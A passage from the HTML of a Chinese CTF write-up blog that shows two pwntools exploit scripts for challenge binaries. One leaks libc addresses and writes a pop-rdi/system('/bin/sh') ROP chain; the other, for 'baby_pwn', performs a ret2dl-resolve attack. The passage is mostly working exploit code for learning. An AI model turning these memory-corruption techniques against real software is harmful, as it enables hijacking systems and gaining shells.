class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">r = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">__libc_start_main_231_offset = 0x150+296</span><br><span class="line"></span><br><span class="line">r.recvuntil(&quot;name:&quot;)</span><br><span class="line">r.sendline(&quot;radish&quot;)</span><br><span class="line">__libc_start_main_231_addr = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># leak __libc_start_main_231_addr</span><br><span class="line">for x in range(8):</span><br><span class="line">	r.recvuntil(&quot;input index\n&quot;)</span><br><span class="line">	r.sendline(str(__libc_start_main_231_offset+x))</span><br><span class="line">	r.recvuntil(&quot;(hex) &quot;)</span><br><span class="line">	data = r.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">	if len(data)&gt;2:</span><br><span class="line">		data = data[-2:]</span><br><span class="line">	elif len(data)==1:</span><br><span class="line">		data = &quot;0&quot;+data</span><br><span class="line">	__libc_start_main_231_addr = data+__libc_start_main_231_addr</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	r.sendline(&quot;0&quot;)</span><br><span class="line">log.info(&quot;__libc_start_main_231_addr -&gt;&gt; &quot;+__libc_start_main_231_addr)</span><br><span class="line">__libc_start_main_231_addr = eval(&quot;0x&quot;+__libc_start_main_231_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push_r15_offset = 0x150+288</span><br><span class="line">push_r15_addr = &quot;&quot;</span><br><span class="line">for x in range(8):</span><br><span class="line">	r.recvuntil(&quot;input index\n&quot;)</span><br><span class="line">	r.sendline(str(push_r15_offset+x))</span><br><span class="line">	r.recvuntil(&quot;(hex) &quot;)</span><br><span class="line">	data = r.recvuntil(&quot;\n&quot;,drop=True)</span><br><span class="line">	if len(data)&gt;2:</span><br><span class="line">		data = data[-2:]</span><br><span class="line">	elif len(data)==1:</span><br><span class="line">		data = &quot;0&quot;+data</span><br><span class="line">	push_r15_addr = data+push_r15_addr</span><br><span class="line">	r.recvuntil(&quot;input new value\n&quot;)</span><br><span class="line">	r.sendline(&quot;0&quot;)</span><br><span class="line">log.info(&quot;push_r15_addr -&gt;&gt; &quot;+push_r15_addr)</span><br><span class="line">push_r15_addr = eval(&quot;0x&quot;+push_r15_addr)</span><br><span class="line"></span><br><span class="line">main_addr = push_r15_addr - 0x23b</span><br><span class="line"></span><br><span class="line"># cover ret_addr</span><br><span class="line">offset = 0x150+8</span><br><span class="line">main_addr = p64(main_addr).encode(&quot;hex&quot;)</span><br><span class="line">print main_addr</span><br><span class="line">num = 0</span><br><span class="line">for x in range(8):</span><br><span class="line">	r.recvuntil(&quot;input index\n&quot;)</span><br><span class="line">	r.sendline(str(offset+x))</span><br><span class="line">	r.recvuntil(&quot;input new value\n&quot;)</span><br><span class="line">	r.sendline(str(eval(&quot;0x&quot;+main_addr[num:num+2])))</span><br><span class="line">	print str(eval(&quot;0x&quot;+main_addr[num:num+2]))</span><br><span class="line">	num = num + 2</span><br><span class="line"></span><br><span class="line">log.info(&quot;------------------- success cover! -------------------&quot;)</span><br><span class="line">for x in range(41-24):</span><br><span class="line">	r.recvuntil(&quot;input index\n&quot;)</span><br><span class="line">	r.sendline(&quot;0&quot;)</span><br><span class="line">	r.recvuntil(&quot;input new value\n&quot;)</span><br><span class="line">	r.sendline(&quot;0&quot;)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(&quot;yes&quot;)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">log.info(&quot;------------------- ret main success ---------------&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi_addr =  99+push_r15_addr</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = __libc_start_main_231_addr-231</span><br><span class="line"># libc = LibcSearcher(&quot;__libc_start_main&quot;,__libc_start_main_addr)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">base_addr = __libc_start_main_addr-libc.symbols[&quot;__libc_start_main&quot;]</span><br><span class="line">print hex(base_addr)</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;]+base_addr</span><br><span class="line">bin_sh_addr = 0x000000000017d3f3+base_addr</span><br><span class="line">log.info(&quot;system_addr: &quot;+hex(system_addr))</span><br><span class="line">log.info(&quot;bin_sh_addr: &quot;+hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = (p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)).encode(&quot;hex&quot;)</span><br><span class="line">print payload</span><br><span class="line"></span><br><span class="line">r.sendline(&quot;radish&quot;)</span><br><span class="line"></span><br><span class="line">num = 0</span><br><span class="line">for x in range(0,24):</span><br><span class="line">	r.recvuntil(&quot;input index\n&quot;)</span><br><span class="line">	r.sendline(str(offset+x))</span><br><span class="line">	r.recvuntil(&quot;input new value\n&quot;)</span><br><span class="line">	r.sendline(str(eval(&quot;0x&quot;+payload[num:num+2])))</span><br><span class="line">	print str(eval(&quot;0x&quot;+payload[num:num+2]))</span><br><span class="line">	num = num + 2</span><br><span class="line"></span><br><span class="line">log.info(&quot;------------------- cover payload success ---------------&quot;)</span><br><span class="line">for x in range(41-24):</span><br><span class="line">	r.recvuntil(&quot;input index\n&quot;)</span><br><span class="line">	r.sendline(&quot;0&quot;)</span><br><span class="line">	r.recvuntil(&quot;input new value\n&quot;)</span><br><span class="line">	r.sendline(&quot;0&quot;)</span><br><span class="line">r.recv()</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">r.sendline(&quot;yes&quot;)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h3><p>典型的利用Return-to-dl-resolve，网上有现成的脚本</p>
<p>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x8048390</span><br><span class="line">bss = 0x0804a040</span><br><span class="line">vulFunc = 0x804852d</span><br><span class="line"></span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line"># p = remote(&apos;202.120.7.202&apos;, 6666)</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def getReloc(elf, base):</span><br><span class="line">    jmprel = elf.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">    relent = elf.dynamic(&apos;RELENT&apos;)</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line">    return reloc_offset</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(&apos;./pwn&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;A&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;A&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>原理我已经搞了三天了，仍然没复现出来！！！！！</p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
